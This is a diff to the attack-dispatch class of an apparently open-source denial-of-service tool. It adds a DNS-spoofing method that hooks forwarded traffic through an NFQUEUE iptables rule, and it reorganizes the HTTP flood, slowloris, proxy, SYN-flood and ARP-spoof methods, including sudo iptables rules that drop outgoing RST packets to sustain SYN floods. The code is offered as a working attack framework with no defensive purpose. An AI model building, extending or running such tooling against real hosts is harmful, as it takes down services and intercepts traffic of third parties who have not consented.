@@ -7,13 +7,17 @@ import socket
 import sys
 from threading import Thread
 from time import sleep, time
-from typing import Callable, Dict, Iterator, List, Tuple, Union
+from typing import Dict, Iterator, List, Tuple, Union
 
 from colorama import Fore as F
 from humanfriendly import Spinner, format_timespan
 
-from tools.addons.ip_tools import get_host_ip, get_target_address, get_target_domain
+from tools.addons.ip_tools import get_host_ip, get_target_address
 from tools.addons.sockets import create_socket, create_socket_proxy
+
+L7_METHODS = ["http", "http-proxy", "slowloris", "slowloris-proxy", "dns-spoof"]
+L4_METHODS = ["syn-flood"]
+L2_METHODS = ["arp-spoof"]
 
 
 class AttackMethod:
@@ -54,34 +58,44 @@ class AttackMethod:
         Returns:
             None
         """
-        if self.method_name in ["http", "http-proxy", "slowloris", "slowloris-proxy"]:
-            self.layer_number = 7
-        elif self.method_name == "syn-flood":
-            rule = int(
-                os.popen(
-                    f"sudo iptables --check OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP > /dev/null 2>&1; echo $?"
-                ).read()[0]
-            )
-            if rule:
-                os.system(
-                    f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
-                )
-            self.layer_number = 4
-        elif self.method_name in ["arp-spoof"]:
-            self.layer_number = 2
-        directory = f"tools.L{self.layer_number}.{self.method_name}"
+        if self.method_name in L7_METHODS:
+            layer_number = 7
+        elif self.method_name in L4_METHODS:
+            layer_number = 4
+        elif self.method_name in L2_METHODS:
+            layer_number = 2
+        directory = f"tools.L{layer_number}.{self.method_name}"
         module = __import__(directory, fromlist=["object"])
         self.method = getattr(module, "flood")
 
+    def fill_tables(self) -> None:
+        if self.method_name == "syn-flood":
+            os.system(
+                f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
+            )
+        elif self.method_name == "dns-spoof":
+            from netfilterqueue import NetfilterQueue
+
+            os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 1")
+            self.queue = NetfilterQueue()
+            self.queue.bind(1, self.method)
+
     def __enter__(self) -> AttackMethod:
-        """Set flood function and target attributes."""
+        """Set the flood function, fill iptables and format the target."""
         self.get_method_by_name()
-        if self.layer_number != 2:
+        self.fill_tables()
+        if self.method_name not in ["arp-spoof", "dns-spoof"]:
             self.target = get_target_address(self.target)
         return self
 
     def __exit__(self, exc_type, exc_value, traceback) -> None:
-        """Do nothing, only for context manager."""
+        """Drop any rule that were added to iptables."""
+        if self.method_name == "syn-flood":
+            os.system(
+                f"sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
+            )
+        if self.method_name == "dns-spoof":
+            os.system(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num 1")
 
     def __run_timer(self) -> None:
         """Verify the execution time every second."""
@@ -94,7 +108,7 @@ class AttackMethod:
         self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
     ) -> None:
         """Run slowloris and slowloris-proxy attack methods."""
-        if "proxy" in self.method_name:
+        if self.method_name == "slowloris-proxy":
             try:
                 self.method(args[0], args[1])
             except (ConnectionResetError, BrokenPipeError):
@@ -102,7 +116,7 @@ class AttackMethod:
                     target=self.__run_flood, args=create_socket_proxy(self.target)
                 )
                 self.thread.start()
-        else:
+        elif self.method_name == "slowloris":
             try:
                 self.method(args[0])
             except (ConnectionResetError, BrokenPipeError):
@@ -117,8 +131,19 @@ class AttackMethod:
     ) -> None:
         """Start the flooder."""
         while self.is_running:
-            if "slowloris" in self.method_name:
+
+            # Methods that carry objects to the flood function
+            if self.method_name in ["slowloris", "slowloris-proxy"]:
                 self.__slow_flood(*args)
+
+            # Methods that process packets before sending them
+            elif self.method_name in ["dns-spoof"]:
+                print(
+                    f"{F.MAGENTA} [!] {F.GREEN}{self.target}{F.RESET} is now being {F.RED}DNS-SPOOFED{F.RESET}\n"
+                )
+                self.queue.run()
+
+            # Methods that use the default behavior of threading attack
             else:
                 self.method(self.target)
 
@@ -129,11 +154,11 @@ class AttackMethod:
             total=100,
         ) as spinner:
             for index in range(self.threads_count):
-                if "proxy" in self.method_name:
+                if self.method_name == "slowloris-proxy":
                     yield Thread(
                         target=self.__run_flood, args=create_socket_proxy(self.target)
                     )
-                else:
+                elif self.method_name == "slowloris":
                     yield Thread(
                         target=self.__run_flood, args=(create_socket(self.target),)
                     )
@@ -152,7 +177,7 @@ class AttackMethod:
 
     def __run_threads(self) -> None:
         """Initialize the threads and start them."""
-        if "slowloris" in self.method_name:
+        if self.method_name in ["slowloris", "slowloris-proxy"]:
             self.threads = list(self.__slow_threads())
         else:
             self.threads = [
@@ -172,26 +197,20 @@ class AttackMethod:
 
     def start(self) -> None:
         """Start the DoS attack itself."""
-        if self.layer_number == 2:
-            ip = self.target
-            port = "ARP"
-        else:
-            domain, port = get_target_domain(self.target)
-            ip = socket.gethostbyname(domain)
         duration = format_timespan(self.duration)
 
         print(
-            f"{F.MAGENTA}\n[!] {F.BLUE}Attacking {F.MAGENTA}{self.target} {F.BLUE}({ip}:{port})"
-            f" using {F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n"
-            f"[!] {F.BLUE}The attack will stop after {F.MAGENTA}{duration}{F.BLUE}\n{F.RESET}"
+            f"{F.MAGENTA}\n [!] {F.BLUE}Attacking {F.MAGENTA}{self.target}{F.BLUE} using "
+            f"{F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n"
+            f" [!] {F.BLUE}The attack will stop after {F.MAGENTA}{duration}{F.BLUE}\n{F.RESET}"
         )
-        if "slowloris" in self.method_name:
+        if self.method_name in ["slowloris", "slowloris-proxy"]:
             print(
-                f"{F.MAGENTA}[!] {F.BLUE}Sockets that eventually went down are automatically recreated!\n\n{F.RESET}"
+                f"{F.MAGENTA} [!] {F.BLUE}Sockets that eventually went down are automatically recreated!\n\n{F.RESET}"
             )
         elif self.method_name == "http-proxy":
             print(
-                f"{F.MAGENTA}[!] {F.BLUE}Proxies that don't return 200 status are automatically replaced!\n\n{F.RESET}"
+                f"{F.MAGENTA} [!] {F.BLUE}Proxies that don't return 200 status are automatically replaced!\n\n{F.RESET}"
             )
 
         self.is_running = True
